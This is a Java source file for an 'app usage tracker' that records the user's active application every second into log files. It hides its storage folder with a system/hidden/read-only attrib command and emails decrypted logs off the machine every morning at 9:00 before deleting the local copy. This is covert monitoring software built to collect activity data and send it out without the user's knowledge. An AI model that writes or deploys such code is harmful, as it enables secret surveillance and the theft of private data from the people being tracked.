import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.time.Duration;
import java.time.LocalDate;
import java.time.LocalDateTime;
import java.time.LocalTime;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class AppUsageTracker {
	private static Map<LocalDate, LinkedHashMap<String, Long>> appUsageByDay = new HashMap<>();
	private static FileWriter usageLogWriter; // FileWriter instance for usage log
	private static FileWriter totalTimeWriter; // FileWriter instance for total time
	private static FileWriter hashWriter;
	private static Map<String, LogUpdaterThread> logUpdaterThreads = new HashMap<>();

	public static void main(String[] args) throws IOException {
		try {
			// Get the user's home directory
			String userHome = System.getProperty("user.home");

			// Create a folder named "UsageTracker" in the user's home directory
			File folder = new File(userHome + File.separator + "UsageTracker");
			folder.mkdirs(); // Create the folder if it doesn't exist

			// Create the path to the "total_time.txt" file within the folder
			String filePath = folder.getPath() + File.separator + "total_time.txt";
			String decyptedPath = folder.getPath() + File.separator + "decrypted_logs.txt";
			String HashPath = folder.getPath() + File.separator + "hashes.txt";

			hashWriter = new FileWriter(HashPath, true);
			// Initialize total time FileWriter with the specified file path
			totalTimeWriter = new FileWriter(filePath, true);
			makeFolderHidden(folder);
			scheduleEmailLogsTask(decyptedPath);
		} catch (IOException e) {
			e.printStackTrace();
		}

		Runtime.getRuntime().addShutdownHook(new Thread(() -> {
			closeWriters(); // Close both writers on program termination
		}));

		while (true) {
			try {
				LocalDateTime currentDateTime = LocalDateTime.now();
				Map<String, Long> runningApps = getRunningApps();

				for (Map.Entry<String, Long> entry : runningApps.entrySet()) {
					String appName = entry.getKey();
					Long duration = entry.getValue();

					if (!logUpdaterThreads.containsKey(appName)) {
						LogUpdaterThread logUpdaterThread = new LogUpdaterThread(appName, totalTimeWriter);
						logUpdaterThreads.put(appName, logUpdaterThread);
						logUpdaterThread.start();
					}
				}

				Thread.sleep(1000); // Wait for 1 second

			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
	}
	
	 private static void scheduleEmailLogsTask(String filePath) {
	        // Schedule the task to run every day at 9:00 AM
	        ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
	        long initialDelay = getTimeUntilNextExecution(9, 0);
	        LogReader.decryptLogFile();

	        scheduler.scheduleAtFixedRate(() -> {
	            // Execute the task to send email logs
	            sendEmailLogs(filePath);
	        }, initialDelay, TimeUnit.DAYS.toMillis(1), TimeUnit.MILLISECONDS);
	    }
	 private static void sendEmailLogs(String filePath) {
	        // You can create an instance of EmailLogs and call the sendEmail method
	        EmailLogs emailLogs = new EmailLogs();
	        emailLogs.sendEmail(filePath);
	        File decryptedFile = new File(filePath);
	        if (decryptedFile.exists()) {
	        	decryptedFile.delete();
	        }
	    }
	 
	 private static long getTimeUntilNextExecution(int targetHour, int targetMinute) {
	        LocalDateTime now = LocalDateTime.now();
	        LocalDateTime targetTime = LocalDateTime.of(now.toLocalDate(), LocalTime.of(targetHour, targetMinute));
	        if (now.compareTo(targetTime) > 0) {
	            targetTime = targetTime.plusDays(1);
	        }
	        return Duration.between(now, targetTime).toMillis();
	    }

	private static void makeFolderHidden(File folder) {
		try {
			String folderPath = folder.getAbsolutePath();

			// Execute the attrib command to make the folder hidden
			ProcessBuilder processBuilder = new ProcessBuilder("cmd.exe", "/c", "attrib +h +s +r " + folderPath);
			Process process = processBuilder.start();
			process.waitFor();

			// Check the exit status to see if the command was successful
			int exitStatus = process.exitValue();
			if (exitStatus == 0) {
//                System.out.println("Folder hidden successfully.");
			} else {
//                System.err.println("Failed to hide the folder.");
			}
		} catch (IOException | InterruptedException e) {
			e.printStackTrace();
		}
	}

	private static Map<String, Long> getRunningApps() {
		ActiveAPP a = new ActiveAPP();
		Map<String, Long> runningApps = new HashMap<>();
		String activeApp = a.active();
		runningApps.put(activeApp, (long) (Math.random() * 10)); // Random duration in seconds
		return runningApps;
	}

	private static void closeWriters() {
		try {
			if (usageLogWriter != null) {
				usageLogWriter.close(); // Close the usage log FileWriter
			}
			if (totalTimeWriter != null) {
				totalTimeWriter.close(); // Close the total time FileWriter
			}
			if (hashWriter != null) {
				hashWriter.close();
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

}
